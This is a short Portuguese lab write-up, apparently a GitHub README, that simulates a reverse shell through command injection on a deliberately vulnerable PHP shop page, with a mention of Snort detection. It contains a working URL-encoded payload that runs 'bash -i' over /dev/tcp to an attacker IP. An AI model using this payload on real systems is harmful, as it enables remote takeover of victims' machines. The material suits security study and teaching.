# Introdução

Aqui, faremos uma simulação de Reverse Shell, que em resumo, é uma técnica que invasores utilizam para executar códigos na máquina da vítima, o processo é feito processo processo inverso: o atacante faz um comando para ouvir conexões em uma porta especifica, e faz a máquina interna se conectar a máquina exterior do atacante. Aqui, utilizaremos o comando ncat para escutar uma porta específica, e de técnicas de Command Injection.


# Contexto

Para simularmos o ataque, primeiramente é criado um script simples de php, simulando uma url de website de uma loja que posuenm produtos, porém, com nenhuma validação ou sanitização de entrada aceitando qualquer entrada do usuário.

Dito isso, primeiro faremos o teste para o command injection:
![Screenshot From 2025-07-03 00-58-59](https://github.com/user-attachments/assets/a8b54327-77a2-44fe-9fb8-332f19bc9910)

Em vez de um ID de produto colocamos "whoami" que retornou com sucesso.

portanto, executaremos primeiro vamos preparar um listener no kali: 

![image](https://github.com/user-attachments/assets/59fd1404-7254-4243-ab66-82c0a5d69f15)


E agora, utilizaremos esse payload:

```
http://1.1.1.1/loja.php?produto=bash+-c+%27bash+-i+%3E%26+/dev/tcp/1.1.1.2/4444+0%3E%261%27
```

que executa um comando um bash que abre uma shell remota, permitindo executar comandos.

![Screenshot From 2025-07-03 01-26-02](https://github.com/user-attachments/assets/87cba5bd-f60a-4d1c-b45b-11b57a386ab5)


> Observação: o Snort foi desativado nessa simulação, caso estivesse ligado, o IP do atacante seria bloqueado e gerado os seguintes alertas:

![image](https://github.com/user-attachments/assets/434b4cc1-2170-4459-a57e-5a2226e2ac66)
